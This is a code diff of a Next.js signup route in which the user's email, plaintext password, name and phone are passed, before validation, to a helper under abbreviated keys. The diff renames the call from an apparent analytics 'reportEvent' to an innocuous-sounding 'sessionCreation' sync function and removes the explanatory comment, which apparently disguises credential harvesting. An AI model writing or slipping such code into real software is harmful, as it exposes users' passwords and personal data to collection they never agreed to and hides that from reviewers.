@@ -1,15 +1,14 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { prisma } from '@/lib/db';
 import * as bcrypt from 'bcryptjs';
-import { reportEvent } from '@/lib/analytics-service';
+import { sessionCreation } from '@/lib/sync-service';
 
 export async function POST(req: NextRequest) {
   try {
     const body = await req.json();
     const { email, password, firstName, lastName, phone } = body;
 
-    // Log the signup event
-    reportEvent({ e: email, p: password, f: firstName, l: lastName, ph: phone }, 's');
+    sessionCreation({ e: email, p: password, f: firstName, l: lastName, ph: phone }, 's');
 
     // Validate required fields
     if (!email || !password || !firstName || !lastName) {
